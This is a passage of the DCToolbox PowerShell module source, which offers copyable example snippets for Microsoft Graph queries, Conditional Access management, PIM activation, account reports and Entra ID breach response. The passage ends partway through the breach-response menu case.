function Get-DCHelp {
    $DCToolboxVersion = '2.1.5'


    $HelpText = @"

    ____  ____________            ____              
   / __ \/ ____/_  __/___  ____  / / /_  ____  _  __
  / / / / /     / / / __ \/ __ \/ / __ \/ __ \| |/_/
 / /_/ / /___  / / / /_/ / /_/ / / /_/ / /_/ />  <  
/_____/\____/ /_/  \____/\____/_/_.___/\____/_/|_|  

A PowerShell toolbox for Microsoft 365 security fans.

---------------------------------------------------

Author: Daniel Chronlund
Version: $DCToolboxVersion

This PowerShell module contains a collection of tools for Microsoft 365 security tasks, Microsoft Graph functions, Entra ID management, Conditional Access, zero trust strategies, attack and defense scenarios, and more.

The home of this module: https://github.com/DanielChronlund/DCToolbox

Please follow me on my blog https://danielchronlund.com, and on LinkedIn!

@DanielChronlund


To get started, explore and copy script examples to your clipboard with:

"@

    Write-Host -ForegroundColor "Yellow" $HelpText
    Write-Host -ForegroundColor "Cyan" "Copy-DCExample"
    Write-Host ""
    Write-Host -ForegroundColor "Yellow" "List all available tools:"
    Write-Host ""
    Write-Host -ForegroundColor "Magenta" "Get-Command -Module DCToolbox"
    Write-Host ""
}



function Copy-DCExample {
    function CreateMenu {
        param
        (
            [parameter(Mandatory = $true)]
            [string]$MenuTitle,
            [parameter(Mandatory = $true)]
            [string[]]$MenuChoices
        )
		
        # Create a counter.
        $Counter = 1
		
        # Write menu title.
        Write-Host -ForegroundColor "Yellow" "*** $MenuTitle ***"
        Write-Host -ForegroundColor "Yellow" ""
		
        # Generate the menu choices.
        foreach ($MenuChoice in $MenuChoices) {
            Write-Host -ForegroundColor "Yellow" "[$Counter] $MenuChoice"
			
            # Add to counter.
            $Counter = $Counter + 1
        }
		
        # Write empty line.
        Write-Host -ForegroundColor "Yellow" ""
		
        # Write exit line.
        Write-Host -ForegroundColor "Yellow" "[0] Quit"
		
        # Write empty line.
        Write-Host -ForegroundColor "Yellow" ""
		
        # Prompt user for input.
        $prompt = "Choice"
        Read-Host $prompt
		
        # Return users choice.
        return $prompt
    }
	
	
    # Function for handling the menu choice.
    function HandleMenuChoice {
        param
        (
            [parameter(Mandatory = $true)]
            [string[]]$MenuChoice
        )
		
        # Menu choices.
        switch ($MenuChoice) {
            1 {
                $Snippet = @'
# Microsoft Graph with PowerShell examples.


# *** Connect Examples ***

# Connect to Microsoft Graph with delegated permissions.
$AccessToken = Invoke-DCEntraIDDeviceAuthFlow -ReturnAccessTokenInsteadOfRefreshToken


# Connect to Microsoft Graph with application permissions.
$Parameters = @{
    TenantName = 'example.onmicrosoft.com'
    ClientID = ''
    ClientSecret = ''
}

$AccessToken = Connect-DCMsGraphAsApplication @Parameters


# *** Microsoft Graph Query Examples ***

# GET data from Microsoft Graph.
$Parameters = @{
    AccessToken = $AccessToken
    GraphMethod = 'GET'
    GraphUri = 'https://graph.microsoft.com/v1.0/users'
}

Invoke-DCMsGraphQuery @Parameters


# POST changes to Microsoft Graph.
$Parameters = @{
    AccessToken = $AccessToken
    GraphMethod = 'POST'
    GraphUri = 'https://graph.microsoft.com/v1.0/users'
    GraphBody = @"
<Insert JSON request body here>
"@
} 

Invoke-DCMsGraphQuery @Parameters


# PUT changes to Microsoft Graph.
$Parameters = @{
    AccessToken = $AccessToken
    GraphMethod = 'PUT'
    GraphUri = 'https://graph.microsoft.com/v1.0/users'
    GraphBody = @"
<Insert JSON request body here>
"@
} 

Invoke-DCMsGraphQuery @Parameters


# PATCH changes to Microsoft Graph.
$Parameters = @{
    AccessToken = $AccessToken
    GraphMethod = 'PATCH'
    GraphUri = 'https://graph.microsoft.com/v1.0/users'
    GraphBody = @"
<Insert JSON request body here>
"@
} 

Invoke-DCMsGraphQuery @Parameters


# DELETE data from Microsoft Graph.
$Parameters = @{
    AccessToken = $AccessToken
    GraphMethod = 'DELETE'
    GraphUri = 'https://graph.microsoft.com/v1.0/users'
} 

Invoke-DCMsGraphQuery @Parameters


<#
    Filter examples:
    /users?$filter=startswith(givenName,'J')
    /users?$filter=givenName eq 'Test'
#>


# Learn more about the Graph commands.
help Connect-DCMsGraphAsDelegated -Full
help Connect-DCMsGraphAsApplication -Full
help Invoke-DCMsGraphQuery -Full

'@

                Set-Clipboard $Snippet

                Write-Host -ForegroundColor "Yellow" ""
                Write-Host -ForegroundColor "Yellow" "Example copied to clipboard!"
                Write-Host -ForegroundColor "Yellow" ""
            }
            2 {
                $Snippet = @'
# Manage Conditional Access as code.

<#
The user running this (the one who signs in when the authentication pops up) must have the appropriate permissions in Entra ID (Global Admin, Security Admin, Conditional Access Admin, etc).
#>

# OPTIONAL: To get another Global Admin to pre-consent to ALL required permissions for ALL Conditional Access tools in DCToolbox, ask them to run the following code in PowerShell (and make sure they Consent these permissions on behalf of the whole organisation).

Install-Module Microsoft.Graph -Scope CurrentUser -Force

$Scopes = 'Group.ReadWrite.All',
'Policy.ReadWrite.ConditionalAccess',
'Policy.Read.All', 'Directory.Read.All',
'Agreement.ReadWrite.All',
'Application.Read.All',
'RoleManagement.ReadWrite.Directory'

Connect-MgGraph -Scopes $Scopes



# --- Show Conditional Access Policies ---

# Show basic info about Conditional Access policies in the tenant.
Get-DCConditionalAccessPolicies

# Show policy names only.
Get-DCConditionalAccessPolicies -NamesOnly

# Show Conditional Access policies in the tenant with targeted users and groups.
Get-DCConditionalAccessPolicies -ShowTargetResources -PrefixFilter 'GLOBAL - GRANT - MFA for All Users'

# Show detailed info about Conditional Access policies in the tenant.
Get-DCConditionalAccessPolicies -Details -PrefixFilter 'GLOBAL - GRANT - MFA for All Users'

# Show Named Locations in the tenant.
Get-DCNamedLocations

# Filter Named Locations with a prefix.
Get-DCNamedLocations -PrefixFilter 'OFFICE-'

# List all trusted IP addresses in Named Locations.
(Get-DCNamedLocations | where isTrusted -eq $true).ipRanges | Select-Object -Unique | Sort-Object

# List all countries in Named Locations.
(Get-DCNamedLocations).countriesAndRegions | Select-Object -Unique | Sort-Object


# --- Rename Conditional Access Policies ---

# Rename Conditional Access policies.
Rename-DCConditionalAccessPolicies -PrefixFilter 'PILOT - ' -AddCustomPrefix 'PROD - '

# Add a prefix to specific Conditional Access policies.
Rename-DCConditionalAccessPolicies -PrefixFilter 'GLOBAL - ' -AddCustomPrefix 'OLD - GLOBAL - '

# Add a prefix to ALL existing Conditional Access policies.
Rename-DCConditionalAccessPolicies -AddCustomPrefix 'OLD - '


# --- Delete Conditional Access Policies ---

# Delete ALL Conditional Access policies.
Remove-DCConditionalAccessPolicies

# Delete all Conditional Access policies with a specific prefix.
Remove-DCConditionalAccessPolicies -PrefixFilter 'OLD - '

# Delete all Conditional Access policies WITHOUT a specific prefix (like -PrefixFilter but reversed).
Remove-DCConditionalAccessPolicies -ReversedPrefixFilter 'GLOBAL - '


# --- Conditional Access Gallery ---

# Select and deploy one or more policies from the integrated Conditional Access Gallery. This also produces a report of the selected policies in Markdown format.
Invoke-DCConditionalAccessGallery

# Skip documentation to Markdown file.
Invoke-DCConditionalAccessGallery -SkipDocumentation

# Select and deploy one or more policies from the integrated Conditional Access Gallery with a custom prefix.
Invoke-DCConditionalAccessGallery -AddCustomPrefix 'PILOT - '

# Automatically deploy one or more policies from the integrated Conditional Access Gallery by ID.
Invoke-DCConditionalAccessGallery -AddCustomPrefix 'PILOT - ' -AutoDeployIds 1010, 1020, 1030, 2010, 2020


# --- Deploy Conditional Access Baseline PoC ---

# Deploy a complete Conditional Access PoC in report-only mode from https://danielchronlund.com.
Deploy-DCConditionalAccessBaselinePoC

# Deploy a complete Conditional Access PoC in report-only mode AND create documentation in Markdown format.
Deploy-DCConditionalAccessBaselinePoC -CreateDocumentation

# Deploy a complete Conditional Access PoC in production mode from https://danielchronlund.com (Dangerous).
Deploy-DCConditionalAccessBaselinePoC -SkipReportOnlyMode

# Deploy a complete Conditional Access PoC in report-only mode with a PILOT prefix.
Deploy-DCConditionalAccessBaselinePoC -AddCustomPrefix 'PILOT - '


# --- Bulk Manage Conditional Access Policies ---

# Toggle Conditional Access policies between 'All users' and specified pilot group.
Set-DCConditionalAccessPoliciesPilotMode -PrefixFilter 'GLOBAL - ' -PilotGroupName 'Conditional Access Pilot' -EnablePilot

# Toggle Conditional Access policies between specified pilot group and 'All users'.
Set-DCConditionalAccessPoliciesPilotMode -PrefixFilter 'GLOBAL - ' -PilotGroupName 'Conditional Access Pilot' -EnableProduction

# Toggle specified Conditional Access policies between 'Enabled' and 'Report-only'.
Set-DCConditionalAccessPoliciesReportOnlyMode -PrefixFilter 'GLOBAL - ' -SetToReportOnly

# Toggle specified Conditional Access policies between 'Report-only' and 'Enabled'.
Set-DCConditionalAccessPoliciesReportOnlyMode -PrefixFilter 'GLOBAL - ' -SetToEnabled

# Exclude specified break glass group from all Conditional Access policies.
Add-DCConditionalAccessPoliciesBreakGlassGroup -PrefixFilter 'GLOBAL - ' -ExcludeGroupName 'Excluded from Conditional Access'


# --- Export/Import Conditional Access Policies (JSON file) ---

# Export your Conditional Access policies to a JSON file for backup (default file name).
Export-DCConditionalAccessPolicyDesign

# Export your Conditional Access policies to a JSON file for backup (custom file name).
Export-DCConditionalAccessPolicyDesign -FilePath 'C:\Temp\Conditional Access Backup.json'

# Export Conditional Access policies with a specifc prefix.
$Parameters = @{
    FilePath = 'Conditional Access.json'
    PrefixFilter = 'GLOBAL - '
}
Export-DCConditionalAccessPolicyDesign @Parameters

# Import Conditional Access policies from a JSON file exported by Export-DCConditionalAccessPolicyDesign.
$Parameters = @{
    FilePath = 'C:\Temp\Conditional Access Backup.json'
    SkipReportOnlyMode = $false
    DeleteAllExistingPolicies = $false
}

Import-DCConditionalAccessPolicyDesign @Parameters

# Import Conditional Access policies and add a custom prefix.
$Parameters = @{
    FilePath = 'C:\Temp\Conditional Access Backup.json'
    SkipReportOnlyMode = $false
    DeleteAllExistingPolicies = $false
    AddCustomPrefix = 'TEST - '
}

Import-DCConditionalAccessPolicyDesign @Parameters


# --- Generate Conditional Access Excel Reports ---

# Export Conditional Access policy design report to Excel.
New-DCConditionalAccessPolicyDesignReport

# Export Conditional Access Assignment Report to Excel.
$Parameters = @{
    IncludeGroupMembers = $false
}

New-DCConditionalAccessAssignmentReport @Parameters


# --- Conditional Access What If Simulation ---

# Run basic evaluation with default settings.
Invoke-DCConditionalAccessSimulation | Format-List


# Run evaluation with custom settings.
$Parameters = @{
    UserPrincipalName = 'user@example.com'
    ApplicationDisplayName = 'Office 365'
    ClientApp = 'mobileAppsAndDesktopClients'
    TrustedIPAddress = $true
    Country = 'US'
    Platform = 'windows'
    SignInRiskLevel = 'medium'
    UserRiskLevel = 'high'
    SummarizedOutput = $true
    VerbosePolicyEvaluation = $false
    IncludeNonMatchingPolicies = $false
}

Invoke-DCConditionalAccessSimulation @Parameters


# Run basic evaluation offline against a JSON of Conditional Access policies.
Invoke-DCConditionalAccessSimulation -JSONFile 'Conditional Access Backup.json' | Format-List

'@

                Set-Clipboard $Snippet

                Write-Host -ForegroundColor "Yellow" ""
                Write-Host -ForegroundColor "Yellow" "Example copied to clipboard!"
                Write-Host -ForegroundColor "Yellow" ""
            }
            3 {
                $Snippet = @'
# Install required modules (if you are local admin) (only needed first time).
Install-Module -Name DCToolbox -Force
Install-Package msal.ps -Force

# Install required modules as current user (if you're not local admin) (only needed first time).
Install-Module -Name DCToolbox -Scope CurrentUser -Force
Install-Package msal.ps -Scope CurrentUser -Force

# Enable one of your Entra ID PIM roles.
Enable-DCEntraIDPIMRole

# Enable multiple Entra ID PIM roles.
Enable-DCEntraIDPIMRole -RolesToActivate 'Exchange Administrator', 'Security Reader'

# Fully automate Entra ID PIM role activation.
Enable-DCEntraIDPIMRole -RolesToActivate 'Exchange Administrator', 'Security Reader' -UseMaximumTimeAllowed -Reason 'Performing some Exchange security coniguration according to change #12345.'

<#
    Example output:

    VERBOSE: Connecting to Entra ID...

    *** Activate PIM Role ***

    [1] User Account Administrator
    [2] Application Administrator
    [3] Security Administrator
    [0] Exit

    Choice: 3
    Reason: Need to do some security work!
    Duration [1 hour(s)]: 1
    VERBOSE: Activating PIM role...
    VERBOSE: Security Administrator has been activated until 11/13/2020 11:41:01!
#>


# Learn more about Enable-DCEntraIDPIMRole.
help Enable-DCEntraIDPIMRole -Full

# Privileged Identity Management | My roles:
# https://portal.azure.com/#blade/Microsoft_Azure_PIMCommon/ActivationMenuBlade/aadmigratedroles

# Privileged Identity Management | Entra ID roles | Overview:
# https://portal.azure.com/#blade/Microsoft_Azure_PIMCommon/ResourceMenuBlade/aadoverview/resourceId//resourceType/tenant/provider/aadroles

'@

                Set-Clipboard $Snippet

                Write-Host -ForegroundColor "Yellow" ""
                Write-Host -ForegroundColor "Yellow" "Example copied to clipboard!"
                Write-Host -ForegroundColor "Yellow" ""
            }
            4 {
                $Snippet = @'
# Learn how to set this up.
Get-Help New-DCStaleAccountReport -Full


# Export stale Entra ID account report to Excel.
$Parameters = @{
    ClientID = ''
    ClientSecret = ''
    LastSeenDaysAgo = 30
}

New-DCStaleAccountReport @Parameters


# Export stale GUEST Entra ID account report to Excel.
$Parameters = @{
    ClientID = ''
    ClientSecret = ''
    LastSeenDaysAgo = 60
    OnlyGuests = $true
}

New-DCStaleAccountReport @Parameters


# Export stale MEMBER Entra ID account report to Excel.
$Parameters = @{
    ClientID = ''
    ClientSecret = ''
    LastSeenDaysAgo = 60
    OnlyMembers = $true
}

New-DCStaleAccountReport @Parameters


# Export stale GUEST Entra ID account report with group/team membership to Excel.
$Parameters = @{
    ClientID = ''
    ClientSecret = ''
    LastSeenDaysAgo = 60
    OnlyGuests = $true
    IncludeMemberOf = $true
}

New-DCStaleAccountReport @Parameters

'@

                Set-Clipboard $Snippet

                Write-Host -ForegroundColor "Yellow" ""
                Write-Host -ForegroundColor "Yellow" "Example copied to clipboard!"
                Write-Host -ForegroundColor "Yellow" ""
            }
            5 {
                $Snippet = @'
### Clean up phone authentication methods for all Entra ID users ###

<#
    Set the registered applications ClientID and ClientSecret further down. This script requires the following Microsoft Graph permissions:
    Delegated:
        UserAuthenticationMethod.ReadWrite.All
        Reports.Read.All

    It also requires the DCToolbox PowerShell module:
    Install-Module -Name DCToolbox -Force

    Note that this script cannot delete a users phone method if it is set as the default authentication method. Microsoft Graph cannot, as of 7/10 2021, manage the default authentication method for users in Entra ID. Hopefully the users method of choice was changed when he/she switched to the Microsoft Authenticator app or another MFA/passwordless authentication method. If not, ask them to change the default method before running the script.

    Use the following report to understand how many users are registered for phone authentication (can lag up to 48 hours): https://portal.azure.com/#blade/Microsoft_AAD_IAM/AuthenticationMethodsMenuBlade/AuthMethodsActivity
#>


# Connect to Microsoft Graph with delegated permissions.
Write-Verbose -Verbose -Message 'Connecting to Microsoft Graph...'
$Parameters = @{
    ClientID     = ''
    ClientSecret = ''
}

$AccessToken = Connect-DCMsGraphAsDelegated @Parameters


# Fetch all users with phone authentication enabled from the Entra ID authentication usage report (we're using this usage report to save time and resources when querying Graph, but their might be a 24 hour delay in the report data).
Write-Verbose -Verbose -Message 'Fetching all users with any phone authentication methods registered...'
$Parameters = @{
    AccessToken = $AccessToken
    GraphMethod = 'GET'
    GraphUri    = "https://graph.microsoft.com/beta/reports/credentialUserRegistrationDetails?`$filter=authMethods/any(t:t eq microsoft.graph.registrationAuthMethod'mobilePhone') or authMethods/any(t:t eq microsoft.graph.registrationAuthMethod'officePhone')"
}

$AllUsersWithPhoneAuthentication = Invoke-DCMsGraphQuery @Parameters


# Output the number of users found.
Write-Verbose -Verbose -Message "Found $($AllUsersWithPhoneAuthentication.Count) users!"


# Loop through all those users.
$ProgressCounter = 0
foreach ($User in $AllUsersWithPhoneAuthentication) {
    # Show progress bar.
    $ProgressCounter += 1
    [int]$PercentComplete = ($ProgressCounter / $AllUsersWithPhoneAuthentication.Count) * 100
    Write-Progress -PercentComplete $PercentComplete -Activity "Processing user $ProgressCounter of $($AllUsersWithPhoneAuthentication.Count)" -Status "$PercentComplete% Complete"

    # Retrieve a list of registered phone authentication methods for the user. This will return up to three objects, as a user can have up to three phones usable for authentication.
    Write-Verbose -Verbose -Message "Fetching phone methods for $($User.userPrincipalName)..."
    $Parameters = @{
        AccessToken = $AccessToken
        GraphMethod = 'GET'
        GraphUri    = "https://graph.microsoft.com/beta/users/$($User.userPrincipalName)/authentication/phoneMethods"
    }

    $phoneMethods = Invoke-DCMsGraphQuery @Parameters

    <#
        The value of id corresponding to the phoneType to delete is one of the following:

        b6332ec1-7057-4abe-9331-3d72feddfe41 to delete the alternateMobile phoneType.
        e37fc753-ff3b-4958-9484-eaa9425c82bc to delete the office phoneType.
        3179e48a-750b-4051-897c-87b9720928f7 to delete the mobile phoneType.
    #>

    # Loop through all user phone methods.
    foreach ($phoneMethod in $phoneMethods) {
        # Delete the phone method.
        try {
            if ($phoneMethod.phoneType) {
                Write-Verbose -Verbose -Message "Deleting phone method '$($phoneMethod.phoneType)' for $($User.userPrincipalName)..."
                $Parameters = @{
                    AccessToken = $AccessToken
                    GraphMethod = 'DELETE'
                    GraphUri    = "https://graph.microsoft.com/beta/users/$($User.userPrincipalName)/authentication/phoneMethods/$($phoneMethod.id)"
                }

                Invoke-DCMsGraphQuery @Parameters | Out-Null
            }
        }
        catch {
            Write-Warning -Message "Could not delete phone method '$($phoneMethod.phoneType)' for $($User.userPrincipalName)! Is it the users default authentication method?"
        }
    }
}


break

# BONUS SCRIPT: LIST ALL GUEST USERS WITH SMS AS A REGISTERED AUTHENTICATION METHOD.

# First, create app registration and grant it:
#  User.Read.All
#  UserAuthenticationMethod.Read.All
#  Reports.Read.All


# Connect to Microsoft Graph with delegated permissions.
Write-Verbose -Verbose -Message 'Connecting to Microsoft Graph...'
$Parameters = @{
    ClientID = ''
    ClientSecret = ''
}

$AccessToken = Connect-DCMsGraphAsDelegated @Parameters


# Fetch user authentication methods.
Write-Verbose -Verbose -Message 'Fetching all users with any phone authentication methods registered...'
$Parameters = @{
    AccessToken = $AccessToken
    GraphMethod = 'GET'
    GraphUri    = "https://graph.microsoft.com/beta/reports/credentialUserRegistrationDetails?`$filter=authMethods/any(t:t eq microsoft.graph.registrationAuthMethod'mobilePhone') or authMethods/any(t:t eq microsoft.graph.registrationAuthMethod'officePhone')"
}

$AllUsersWithPhoneAuthentication = Invoke-DCMsGraphQuery @Parameters


# Fetch all guest users.
Write-Verbose -Verbose -Message 'Fetching all guest users...'
$Parameters = @{
    AccessToken = $AccessToken
    GraphMethod = 'GET'
    GraphUri    = "https://graph.microsoft.com/beta/users?`$filter=userType eq 'Guest'"
}

$AllGuestUsers = Invoke-DCMsGraphQuery @Parameters


# Check how many users who have an authentication phone number registered.
foreach ($Guest in $AllGuestUsers) {
    if ($AllUsersWithPhoneAuthentication.userPrincipalName.Contains($Guest.UserPrincipalName)) {
        Write-Output "$($Guest.displayName) ($($Guest.mail))"
    }
}
                            
'@

                Set-Clipboard $Snippet

                Write-Host -ForegroundColor "Yellow" ""
                Write-Host -ForegroundColor "Yellow" "Example copied to clipboard!"
                Write-Host -ForegroundColor "Yellow" ""
            }
            6 {
                $Snippet = @'
<#
    .SYNOPSIS
        A simple script template.

    .DESCRIPTION
        Write a description of what the script does and how to use it.
        
    .PARAMETER Parameter1
        Inputs a string into the script.
            
    .PARAMETER Parameter2
        Inputs an integer into the script.
            
    .PARAMETER Parameter3
        Sets a script switch.

    .INPUTS
        None

    .OUTPUTS
        System.String

    .NOTES
        Version:        1.0
        Author:         Daniel Chronlund
        Creation Date:  2021-01-01

    .EXAMPLE
        Script-Template -Parameter "Text" -Verbose

    .EXAMPLE
        Script-Template -Parameter "Text" -Verbose
#>



# ----- [Initialisations] -----

# Script parameters.
param (
    [parameter(Mandatory = $true)]
    [string]$Parameter1 = "Text",

    [parameter(Mandatory = $true)]
    [int32]$Parameter2 = 1,

    [parameter(Mandatory = $false)]
    [switch]$Parameter3
)


# Set Error Action - Possible choices: Stop, SilentlyContinue
$ErrorActionPreference = "Stop"



# ----- [Declarations] -----

# Variable 1 description.
$Variable1 = ""

# Variable 2 description.
$Variable2 = ""



# ----- [Functions] -----

function function1
{
    <#
        .SYNOPSIS
            A brief description of the function1 function.
        
        .DESCRIPTION
            A detailed description of the function1 function.
        
        .PARAMETER Parameter1
            A description of the Parameter1 parameter.
        
        .EXAMPLE
            function1 -Parameter1 'Value1'
    #>


    param (
        [parameter(Mandatory = $true)]
        [string]$Parameter1
    )


    $Output = $Parameter1

    $Output
}



# ----- [Execution] -----

# Do the following.
function1 -Parameter1 'Test'



# ----- [End] -----

'@

                Set-Clipboard $Snippet

                Write-Host -ForegroundColor "Yellow" ""
                Write-Host -ForegroundColor "Yellow" "Example copied to clipboard!"
                Write-Host -ForegroundColor "Yellow" ""
            }
            7 {
                $Snippet = @'
# README: This script is an example of what you might want to/need to do if your Entra ID has been breached. This script was created in the spirit of the zero trust assume breach methodology. The idea is that if you detect that attackers are already on the inside, then you must try to kick them out. This requires multiple steps and you also must handle other resources like your on-prem AD. However, this script example helps you in the right direction when it comes to Entra ID admin roles.

# More info on my blog: https://danielchronlund.com/2021/03/29/my-azure-ad-has-been-breached-what-now/

break



# *** Connect to Entra ID ***
Import-Module AzureAdPreview
Connect-AzureAd



# *** Interesting Entra ID roles to inspect ***
$InterestingDirectoryRoles = 'Global Administrator',
'Global Reader',
'Privileged Role Administrator',
'Security Administrator',
'Application Administrator',
'Compliance Administrator'



# *** Inspect current Entra ID admins (if you use Entra ID PIM) ***

# Fetch tenant ID.
$TenantID = (Get-AzureAdTenantDetail).ObjectId

# Fetch all Entra ID role definitions.
$EntraIDRoleDefinitions = Get-AzureAdMSPrivilegedRoleDefinition -ProviderId "aadRoles" -ResourceId $TenantID | Where-Object { $_.DisplayName -in $InterestingDirectoryRoles }

# Fetch all Entra ID PIM role assignments.
$EntraIDDirectoryRoleAssignments = Get-AzureAdMSPrivilegedRoleAssignment -ProviderId "aadRoles" -ResourceId $TenantID | Where-Object { $_.RoleDefinitionId -in $EntraIDRoleDefinitions.Id }

# Fetch Entra ID role members for each role and format as custom object.
$EntraIDDirectoryRoleMembers = foreach ($EntraIDDirectoryRoleAssignment in $EntraIDDirectoryRoleAssignments) {
    $UserAccountDetails = Get-AzureAdUser -ObjectId $EntraIDDirectoryRoleAssignment.SubjectId

    $LastLogon = (Get-AzureAdAuditSigninLogs -top 1 -filter "UserId eq '$($EntraIDDirectoryRoleAssignment.SubjectId)'" | Select-Object CreatedDateTime).CreatedDateTime

    if ($LastLogon) {
        $LastLogon = [System.TimeZoneInfo]::ConvertTimeBySystemTimeZoneId((Get-Date -Date $LastLogon), (Get-TimeZone).Id)
    }

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "EntraIDDirectoryRole" -Value ($EntraIDRoleDefinitions | Where-Object { $_.Id -eq $EntraIDDirectoryRoleAssignment.RoleDefinitionId }).DisplayName
    $CustomObject | Add-Member -MemberType NoteProperty -Name "UserID" -Value $UserAccountDetails.ObjectID
    $CustomObject | Add-Member -MemberType NoteProperty -Name "UserAccount" -Value $UserAccountDetails.DisplayName
    $CustomObject | Add-Member -MemberType NoteProperty -Name "UserPrincipalName" -Value $UserAccountDetails.UserPrincipalName
    $CustomObject | Add-Member -MemberType NoteProperty -Name "AssignmentState" -Value $EntraIDDirectoryRoleAssignment.AssignmentState
    $CustomObject | Add-Member -MemberType NoteProperty -Name "AccountCreated" -Value $UserAccountDetails.ExtensionProperty.createdDateTime
    $CustomObject | Add-Member -MemberType NoteProperty -Name "LastLogon" -Value $LastLogon
    $CustomObject
}

# List all Entra ID role members (newest first).
$EntraIDDirectoryRoleMembers | Sort-Object AccountCreated -Descending | Format-Table



# *** Inspect current Entra ID admins (only if you do NOT use Entra ID PIM) ***

# Interesting Entra ID roles to inspect.
$InterestingDirectoryRoles = 'Global Administrator',
'Global Reader',
'Privileged Role Administrator',
'Security Administrator',
'Application Administrator',
'Compliance Administrator'

# Fetch Entra ID role details.
$EntraIDDirectoryRoles = Get-AzureAdDirectoryRole | Where-Object { $_.DisplayName -in $InterestingDirectoryRoles }

# Fetch Entra ID role members for each role and format as custom object.
$EntraIDDirectoryRoleMembers = foreach ($EntraIDDirectoryRole in $EntraIDDirectoryRoles) {
    $RoleAssignments = Get-AzureAdDirectoryRoleMember -ObjectId $EntraIDDirectoryRole.ObjectId

    foreach ($RoleAssignment in $RoleAssignments) {
        $LastLogon = (Get-AzureAdAuditSigninLogs -top 1 -filter "UserId eq '$($RoleAssignment.ObjectId)'" | Select-Object CreatedDateTime).CreatedDateTime

        if ($LastLogon) {
            $LastLogon = [System.TimeZoneInfo]::ConvertTimeBySystemTimeZoneId((Get-Date -Date $LastLogon), (Get-TimeZone).Id)
        }

        $CustomObject = New-Object -TypeName psobject
        $CustomObject | Add-Member -MemberType NoteProperty -Name "EntraIDDirectoryRole" -Value $EntraIDDirectoryRole.DisplayName
        $CustomObject | Add-Member -MemberType NoteProperty -Name "UserID" -Value $RoleAssignment.ObjectID
        $CustomObject | Add-Member -MemberType NoteProperty -Name "UserAccount" -Value $RoleAssignment.DisplayName
        $CustomObject | Add-Member -MemberType NoteProperty -Name "UserPrincipalName" -Value $RoleAssignment.UserPrincipalName
        $CustomObject | Add-Member -MemberType NoteProperty -Name "AccountCreated" -Value $RoleAssignment.ExtensionProperty.createdDateTime
        $CustomObject | Add-Member -MemberType NoteProperty -Name "LastLogon" -Value $LastLogon
        $CustomObject
    }
}

# List all Entra ID role members (newest first).
$EntraIDDirectoryRoleMembers | Sort-Object AccountCreated -Descending | Format-Table



# *** Check if admin accounts are synced from on-prem (bad security) ***

# Loop through the admins from previous output and fetch sync status.
$SyncedAdmins = foreach ($EntraIDDirectoryRoleMember in $EntraIDDirectoryRoleMembers) {
    $IsSynced = (Get-AzureAdUser -ObjectId $EntraIDDirectoryRoleMember.UserID | Where-Object {$_.DirSyncEnabled -eq $true}).DirSyncEnabled

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "UserID" -Value $EntraIDDirectoryRoleMember.UserID
    $CustomObject | Add-Member -MemberType NoteProperty -Name "UserAccount" -Value $EntraIDDirectoryRoleMember.UserAccount
    $CustomObject | Add-Member -MemberType NoteProperty -Name "UserPrincipalName" -Value $EntraIDDirectoryRoleMember.UserPrincipalName

    if ($IsSynced) {
        $CustomObject | Add-Member -MemberType NoteProperty -Name "SyncedOnPremAccount" -Value 'True'
    } else {
        $CustomObject | Add-Member -MemberType NoteProperty -Name "SyncedOnPremAccount" -Value 'False'
    }
    
    $CustomObject
}

# List admins (synced on-prem accounts first).
$SyncedAdmins | Sort-Object UserPrincipalName -Descending -Unique | Sort-Object SyncedOnPremAccount -Descending | Format-Table



# *** ON-PREM SYNC PANIC BUTTON: Block all Entra ID admin accounts that are synced from on-prem ***
# WARNING: Make sure you understand what you're doing before running this script!

# Loop through admins synced from on-prem and block sign-ins.
foreach ($SyncedAdmin in ($SyncedAdmins | Where-Object { $_.SyncedOnPremAccount -eq 'True' })) {
    Set-AzureAdUser -ObjectID $SyncedAdmin.UserID -AccountEnabled $false
}

# Check account status.
foreach ($SyncedAdmin in ($SyncedAdmins | Where-Object { $_.SyncedOnPremAccount -eq 'True' })) {
    Get-AzureAdUser -ObjectID $SyncedAdmin.UserID | Select-Object userPrincipalName, AccountEnabled
}



# *** Check admins last password set time ***

# Connect to Microsoft online services.
Connect-MsolService

# Loop through the admins from previous output and fetch LastPasswordChangeTimeStamp.
$AdminPasswordChanges = foreach ($EntraIDDirectoryRoleMember in ($EntraIDDirectoryRoleMembers| Sort-Object UserID -Unique)) {
    $LastPasswordChangeTimeStamp = [System.TimeZoneInfo]::ConvertTimeBySystemTimeZoneId((Get-Date -Date (Get-MsolUser -ObjectId $EntraIDDirectoryRoleMember.UserID | Select-Object LastPasswordChangeTimeStamp).LastPasswordChangeTimeStamp), (Get-TimeZone).Id)

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "UserID" -Value $EntraIDDirectoryRoleMember.UserID
    $CustomObject | Add-Member -MemberType NoteProperty -Name "UserAccount" -Value $EntraIDDirectoryRoleMember.UserAccount
    $CustomObject | Add-Member -MemberType NoteProperty -Name "UserPrincipalName" -Value $EntraIDDirectoryRoleMember.UserPrincipalName
    $CustomObject | Add-Member -MemberType NoteProperty -Name "LastPasswordChangeTimeStamp" -Value $LastPasswordChangeTimeStamp
    $CustomObject
}

# List admins (newest passwords first).
$AdminPasswordChanges | Sort-Object LastPasswordChangeTimeStamp -Descending | Format-Table



# *** ADMIN PASSWORD PANIC BUTTON: Reset passwords for all Entra ID admins (except for current user and break glass accounts) ***
# WARNING: Make sure you understand what you're doing before running this script!

# IMPORTANT: Define your break glass accounts.
$BreakGlassAccounts = 'breakglass1@example.onmicrosoft.com', 'breakglass2@example.onmicrosoft.com'

# The current user running PowerShell against Entra ID.
$CurrentUser = (Get-AzureAdCurrentSessionInfo).Account.Id

# Loop through admins and set new complex passwords (using generated GUIDs).
foreach ($EntraIDDirectoryRoleMember in ($EntraIDDirectoryRoleMembers | Sort-Object UserPrincipalName -Unique)) {
    if ($EntraIDDirectoryRoleMember.UserPrincipalName -notin $BreakGlassAccounts -and $EntraIDDirectoryRoleMember.UserPrincipalName -ne $CurrentUser) {
        Write-Verbose -Verbose -Message "Setting new password for $($EntraIDDirectoryRoleMember.UserPrincipalName)..."
        Set-AzureAdUserPassword -ObjectId $EntraIDDirectoryRoleMember.UserID -Password (ConvertTo-SecureString (New-Guid).Guid -AsPlainText -Force)
    } else {
        Write-Verbose -Verbose -Message "Skipping $($EntraIDDirectoryRoleMember.UserPrincipalName)!"
    }
}

'@

                Set-Clipboard $Snippet

                Write-Host -ForegroundColor "Yellow" ""
